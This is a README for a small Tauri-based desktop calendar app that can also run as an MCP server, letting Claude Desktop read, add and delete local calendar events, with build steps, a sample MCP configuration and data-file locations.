# Stop scrolling or Calendar with MCP (Vibe coded)

A lightweight, local desktop calendar application for organizing events and reminders, featuring native **Model Context Protocol (MCP)** server integration. 

This application is built with **Tauri**, **React**, **TypeScript**, and **Rust**. It compiles down to a single, portable, self-contained executable that manages schedule events fully offline, offering privacy and speed.


## Quick Download

You can download the compiled standalone executable directly here:

* **[Download Standalone stop-scrolling.exe](https://github.com/oxniw/mcp-calendar/releases/latest/download/stop-scrolling.exe)**

*(If you are setting up the MCP server, simply download this `.exe`, run it once, and select the clipboard copier to configure Claude Desktop instantly.)*

---


## Key Features

- **Interactive GUI**: A modern calendar grid with month navigation, daily detail sidebar, copy/shift schedules, and category color-coding (Work, Personal, Important, Other).
- **Native MCP Server**: Launching the application with a `--mcp` CLI flag turns it into a Model Context Protocol server over standard I/O (stdin/stdout), allowing AI assistants (like Claude Desktop) to inspect, add, and delete calendar events.
- **Dynamic Clipboard Configurator**: A one-click "Copy json mcp server" option in the GUI resolves the running executable's path on the fly (`std::env::current_exe()`) and copies the correct JSON-RPC configuration block to the clipboard.
- **Local Data Storage**: All events are stored in a local JSON file under the OS standard AppData directory (`calendar.json`), completely private and shared seamlessly between the GUI and the MCP Server.
- **Active Notifications**: A background Rust thread monitors events and triggers native OS desktop alerts when an event is about to start.

## Quick Download
You can download the compiled standalone executable directly here:
* **[Download Standalone MCP calendar.exe](https://github.com/oxniw/dowloader/raw/refs/heads/main/MCP%20calendar_0.1.0_x64-setup.exe)**
*(If you are setting up the MCP server, simply download this `.exe`, run it once, and select the clipboard copier to configure Claude Desktop instantly.)*
---

## How it Works

The application runs in two modes depending on how it is launched:

1. **GUI Mode** (Default): Launched normally, it opens a lightweight desktop window using Webview2.
2. **MCP Mode** (CLI): Launched with the `--mcp` flag, it intercepts the startup thread before launching the GUI, running a standard stdio loop that listens for JSON-RPC 2.0 requests from AI clients.

---

## Setup & Development

### Prerequisites

Ensure you have the following installed on your machine:
- [Node.js](https://nodejs.org/) (for frontend dependencies)
- [Rust & Cargo](https://rustup.rs/) (for Tauri backend compilation)

### Development

To run the application locally in development mode:
```bash
# Install package dependencies
npm install

# Start the dev server and Tauri window
npm run tauri dev
```

### Production Build

To compile a production-ready, self-contained standalone executable:
```bash
npm run tauri build
```
The compiled output will be generated under `src-tauri/target/release/stop-scrolling.exe`, along with standard installers (MSI / NSIS).

---

## MCP Server Integration (Claude Desktop)

To hook up this calendar to Claude Desktop so your AI assistant can schedule events for you:

1. Open the compiled **Calendar** GUI app.
2. Click the **Schedule Actions** dropdown menu.
3. Select **Copy json mcp server**.
4. Paste the copied configuration block directly into your Claude Desktop configuration file (typically at `%APPDATA%\Claude\claude_desktop_config.json` on Windows):

```json
{
  "mcpServers": {
    "stop-scrolling-calendar": {
      "command": "C:/path/to/stop-scrolling.exe",
      "args": ["--mcp"]
    }
  }
}
```
5. Restart Claude Desktop. The AI assistant will now have access to the `get_events`, `save_event`, and `delete_event` tools!

---

## Stored File Location

Events are saved under the user's roaming application data folder:
- **Windows**: `C:\Users\<Username>\AppData\Roaming\com.onxiw.stop-scrolling\calendar.json`
- **macOS**: `~/Library/Application Support/com.onxiw.stop-scrolling/calendar.json`
- **Linux**: `~/.config/com.onxiw.stop-scrolling/calendar.json`
